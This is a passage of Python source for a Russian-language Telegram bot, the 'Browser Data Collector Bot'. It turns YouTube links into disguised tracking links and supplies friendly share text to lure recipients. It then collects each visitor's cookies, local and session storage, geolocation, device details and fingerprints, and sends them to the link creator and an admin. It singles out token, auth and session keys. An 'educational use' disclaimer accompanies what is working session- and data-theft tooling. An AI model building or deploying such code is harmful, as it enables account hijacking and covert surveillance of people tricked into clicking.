        
        # Добавляем кнопки для быстрого доступа
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([
                InlineKeyboardButton(f"📊 {link.id[:8]}", callback_data=f"stats_{link.id}"),
                InlineKeyboardButton(f"🍪 {link.id[:8]}", callback_data=f"cookies_{link.id}"),
                InlineKeyboardButton(f"💾 {link.id[:8]}", callback_data=f"storage_{link.id}")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_cookies":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("🍪 Нет данных cookies.")
            return
        
        total_cookies = sum(len(link.cookies_collected) for link in user_links)
        
        message = f"""
🍪 *ВСЕ COOKIES ПОЛЬЗОВАТЕЛЯ*

📊 *Общая статистика:*
• Всего ссылок: {len(user_links)}
• Всего cookies: {total_cookies}
• Среднее на ссылку: {total_cookies // max(len(user_links), 1)}

📋 *Ссылки с наибольшим количеством cookies:*
"""
        
        # Сортируем по количеству cookies
        sorted_links = sorted(user_links, key=lambda x: len(x.cookies_collected), reverse=True)
        
        for i, link in enumerate(sorted_links[:5], 1):
            if link.cookies_collected:
                message += f"{i}. `{link.id[:8]}...`: {len(link.cookies_collected)} cookies\n"
        
        # Анализ уникальных cookies
        all_cookie_names = set()
        for link in user_links:
            for cookie in link.cookies_collected:
                all_cookie_names.add(cookie.get('name', 'unknown'))
        
        message += f"\n🔍 *Анализ:*\n"
        message += f"• Уникальных имен cookies: {len(all_cookie_names)}\n"
        
        # Самые частые cookies
        cookie_counts = {}
        for link in user_links:
            for cookie in link.cookies_collected:
                name = cookie.get('name', 'unknown')
                cookie_counts[name] = cookie_counts.get(name, 0) + 1
        
        if cookie_counts:
            top_cookies = sorted(cookie_counts.items(), key=lambda x: x[1], reverse=True)[:5]
            message += f"• Самые частые cookies:\n"
            for name, count in top_cookies:
                message += f"  - `{name}`: {count} раз\n"
        
        keyboard = []
        for link in sorted_links[:3]:
            if link.cookies_collected:
                keyboard.append([InlineKeyboardButton(f"🍪 {link.id[:8]}...", callback_data=f"cookies_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "view_storage":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("💾 Нет данных storage.")
            return
        
        total_storage = sum(len(link.storage_collected) for link in user_links)
        
        message = f"""
💾 *ВСЕ STORAGE ДАННЫЕ ПОЛЬЗОВАТЕЛЯ*

📊 *Общая статистика:*
• Всего ссылок: {len(user_links)}
• Всего записей storage: {total_storage}
• Среднее на ссылку: {total_storage // max(len(user_links), 1)}

📋 *Распределение по типам:*
"""
        
        # Анализ по типам
        type_counts = {"localStorage": 0, "sessionStorage": 0}
        for link in user_links:
            for item in link.storage_collected:
                item_type = item.get('type', 'unknown')
                type_counts[item_type] = type_counts.get(item_type, 0) + 1
        
        for item_type, count in type_counts.items():
            message += f"• {item_type}: {count} записей\n"
        
        # Поиск важных ключей
        important_keys_found = set()
        for link in user_links:
            for item in link.storage_collected:
                key = str(item.get('key', '')).lower()
                if any(important in key for important in ["token", "auth", "session", "user", "login"]):
                    important_keys_found.add(item.get('key', 'unknown'))
        
        if important_keys_found:
            message += f"\n🔐 *Важные ключи найдены:* {len(important_keys_found)}\n"
            for key in list(important_keys_found)[:5]:
                message += f"• `{key}`\n"
        
        keyboard = []
        sorted_links = sorted(user_links, key=lambda x: len(x.storage_collected), reverse=True)
        for link in sorted_links[:3]:
            if link.storage_collected:
                keyboard.append([InlineKeyboardButton(f"💾 {link.id[:8]}...", callback_data=f"storage_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("cookies_"):
        link_id = data[8:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_detailed_cookies(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("storage_"):
        link_id = data[8:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_detailed_storage(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её
4. Когда получатель перейдет - данные соберутся автоматически
5. Получите все данные браузера в этот чат

🔐 *Что именно собирается:*
• *Все cookies:* Все cookies текущего сайта и связанных доменов
• *localStorage:* Все данные из localStorage браузера
• *sessionStorage:* Все данные из sessionStorage браузера
• *IndexedDB:* Список всех IndexedDB баз данных
• *Информация о браузере:* Полный User-Agent, языки, платформа
• *Информация об устройстве:* Разрешение экрана, цветовая глубина
• *Геолокация:* Точные координаты (если разрешено)
• *Медиаустройства:* Камеры, микрофоны, динамики
• *WebGL fingerprint:* Уникальный отпечаток графической системы
• *Canvas fingerprint:* Уникальный отпечаток canvas
• *Шрифты:* Список установленных шрифтов

⏱️ *Время сбора:* ~2-5 секунд
💾 *Объем данных:* Полная дамп всех данных браузера

⚠️ *Важные предупреждения:*
• Используйте только в образовательных целях
• Соблюдайте законы о конфиденциальности
• Данные хранятся 24 часа
• Все действия логируются

🔧 *Техническая поддержка:* @support
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            tracking_url = link_generator.create_tracking_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{tracking_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            tracking_url = link_generator.create_tracking_url(link.video_id, link_id)
            share_text = f"""
🎬 *Смотри это крутое видео!*

Я нашел очень интересное видео на YouTube, обязательно посмотри!

🔗 *Ссылка:*
{tracking_url}

Думаю, тебе понравится! 😊
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("stats_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = f"""
📊 *ДЕТАЛЬНАЯ СТАТИСТИКА ПО ССЫЛКЕ*

🔗 *ID:* `{link.id}`
🎥 *Видео:* {link.original_url[:40]}...
📅 *Создано:* {link.created_at}
🔄 *Статус:* {'🟢 Активна' if link.active else '🔴 Неактивна'}

📈 *МЕТРИКИ:*
• Всего переходов: {link.clicks}
• Сборов данных: {len(link.data_collected)}
• Cookies собрано: {len(link.cookies_collected)}
• Storage записей: {len(link.storage_collected)}
• Среднее cookies на переход: {len(link.cookies_collected) // max(link.clicks, 1)}
• Среднее storage на переход: {len(link.storage_collected) // max(link.clicks, 1)}

👥 *ИСТОРИЯ ПЕРЕХОДОВ:*
"""
            if link.data_collected:
                for i, data_item in enumerate(link.data_collected[-5:], 1):
                    timestamp = data_item.get('timestamp', 'unknown')[:16]
                    ip = data_item.get('ip', 'unknown') if isinstance(data_item, dict) else 'unknown'
                    message += f"{i}. {timestamp} - {ip}\n"
            else:
                message += "Пока нет данных\n"
            
            # Уникальные данные
            unique_cookies = len(set(c.get('name') for c in link.cookies_collected))
            message += f"""
🔍 *УНИКАЛЬНЫЕ ДАННЫЕ:*
• Уникальных cookies: {unique_cookies}
• Уникальных storage ключей: {len(set(s.get('key') for s in link.storage_collected))}
• Уникальных IP: {len(set(d.get('ip') for d in link.data_collected if isinstance(d, dict)))}

📅 *АКТИВНОСТЬ:*
• Первый переход: {link.data_collected[0].get('timestamp', 'нет')[:16] if link.data_collected else 'нет'}
• Последний переход: {link.data_collected[-1].get('timestamp', 'нет')[:16] if link.data_collected else 'нет'}
• Всего активных дней: {len(set(d.get('timestamp', '')[:10] for d in link.data_collected))}
"""
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("delete_"):
        link_id = data[7:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            # Помечаем как неактивную
            link.active = False
            db.save()
            
            await query.message.reply_text(
                f"🗑️ *Ссылка удалена*\n\n"
                f"ID: `{link.id}`\n"
                f"Ссылка помечена как неактивная.\n"
                f"Статистика и данные сохранены.\n\n"
                f"📊 *Итоговая статистика:*\n"
                f"• Переходов: {link.clicks}\n"
                f"• Данных собрано: {len(link.data_collected)}\n"
                f"• Cookies: {len(link.cookies_collected)}\n"
                f"• Storage: {len(link.storage_collected)}",
                parse_mode=ParseMode.MARKDOWN
            )

# Webhook обработчик для сбора данных
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от веб-страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Обрабатываем данные
        if request_data.get("data_type") == "full_collection":
            processing_result = await data_processor.process_collected_data(request_data)
        else:
            # Простая обработка для других типов данных
            collected_data = {
                "timestamp": datetime.now().isoformat(),
                "ip": request_data.get("ip", "unknown"),
                "user_agent": request_data.get("user_agent", "unknown"),
                "data": request_data.get("data", {})
            }
            db.add_collected_data(link_id, collected_data)
            processing_result = {"status": "processed"}
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if link and link.active:
            # Отправляем данные создателю ссылки
            if processing_result.get("status") == "processed":
                # Получаем последние данные
                if link.data_collected:
                    last_data = link.data_collected[-1]
                    analysis = processing_result.get("analysis", {})
                    
                    message = formatter.format_collected_data(link_id, last_data, analysis)
                    
                    await context.bot.send_message(
                        chat_id=link.created_by,
                        text=message,
                        parse_mode=ParseMode.MARKDOWN
                    )
            
            # Отправляем уведомление админу
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"📨 Новый сбор данных по ссылке {link_id}\n"
                         f"Пользователь: {link.created_by}\n"
                         f"Кликов: {link.clicks}\n"
                         f"Cookies: {len(link.cookies_collected)}\n"
                         f"Storage: {len(link.storage_collected)}"
                )
            except:
                pass
        
        return {"status": "success", "processing": processing_result}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}")
        return {"status": "error", "message": str(e)}

# Команда для просмотра данных
async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /data для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n\n"
            "Пример: `/data abc123def456`\n\n"
            "Также доступны команды:\n"
            "• `/cookies [ID]` - просмотр cookies\n"
            "• `/storage [ID]` - просмотр storage\n"
            "• `/stats [ID]` - статистика по ссылке",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.cookies_collected)}\n"
            message += f"  Storage: {len(link.storage_collected)}\n"
            message += f"  Статус: {'🟢' if link.active else '🔴'}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        if not link.data_collected:
            await update.message.reply_text("📭 Нет собранных данных для этой ссылки.")
            return
        
        last_data = link.data_collected[-1]
        
        # Создаем простой анализ
        analysis = {
            "summary": {
                "total_cookies": len(link.cookies_collected),
                "local_storage_items": len([s for s in link.storage_collected if s.get('type') == 'localStorage']),
                "session_storage_items": len([s for s in link.storage_collected if s.get('type') == 'sessionStorage']),
                "browser_info": {
                    "user_agent": last_data.get('user_agent', 'unknown')[:100] if isinstance(last_data, dict) else 'unknown'
                }
            },
            "detected": {},
            "risks": []
        }
        
        message = formatter.format_collected_data(link.id, last_data, analysis)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

# Команда для просмотра cookies
async def cookies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /cookies для просмотра cookies"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🍪 *Просмотр cookies*\n\n"
            "Используйте: `/cookies [ID_ссылки]`\n\n"
            "Пример: `/cookies abc123def456`\n\n"
            "Показывает все собранные cookies по указанной ссылке.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    link_id = context.args[0]
    link = db.get_link(link_id)
    
    if not link:
        await update.message.reply_text("❌ Ссылка не найдена.")
        return
    
    if link.created_by != user.id:
        await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
        return
    
    message = formatter.format_detailed_cookies(link)
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True
    )

# Команда для просмотра storage
async def storage_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /storage для просмотра storage"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "💾 *Просмотр storage*\n\n"
            "Используйте: `/storage [ID_ссылки]`\n\n"
            "Пример: `/storage abc123def456`\n\n"
            "Показывает все данные из localStorage и sessionStorage.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    link_id = context.args[0]
    link = db.get_link(link_id)
    
    if not link:
        await update.message.reply_text("❌ Ссылка не найдена.")
        return
    
    if link.created_by != user.id:
        await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
        return
    
    message = formatter.format_detailed_storage(link)
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True
    )

# Команда для сброса ссылки
async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /reset для сброса статистики"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔄 *Сброс статистики*\n\n"
            "Используйте: `/reset [ID_ссылки]`\n\n"
            "Пример: `/reset abc123def456`\n\n"
            "⚠️ *Внимание:* Это обнулит счетчик переходов.\n"
            "Все собранные данные останутся доступны.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    link_id = context.args[0]
    link = db.get_link(link_id)
    
    if not link:
        await update.message.reply_text("❌ Ссылка не найдена.")
        return
    
    if link.created_by != user.id:
        await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
        return
    
    # Сбрасываем счетчик кликов
    old_clicks = link.clicks
    link.clicks = 0
    db.save()
    
    await update.message.reply_text(
        f"🔄 *Статистика сброшена*\n\n"
        f"ID ссылки: `{link.id}`\n"
        f"Старые переходы: {old_clicks}\n"
        f"Новые переходы: {link.clicks}\n\n"
        f"📊 *Сохраненные данные:*\n"
        f"• Всего сборов: {len(link.data_collected)}\n"
        f"• Cookies: {len(link.cookies_collected)}\n"
        f"• Storage: {len(link.storage_collected)}",
        parse_mode=ParseMode.MARKDOWN
    )

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}")
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ Ошибка в боте: {context.error}"
        )
    except:
        pass

def main():
    """Запуск бота"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", data_command))
    application.add_handler(CommandHandler("cookies", cookies_command))
    application.add_handler(CommandHandler("storage", storage_command))
    application.add_handler(CommandHandler("reset", reset_command))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    print("🤖 Browser Data Collector Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🔐 Полный сбор cookies и localStorage активен")
    print("🍪 JavaScript инъекция готова к работе")
    print("⏳ Ожидание команд...")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()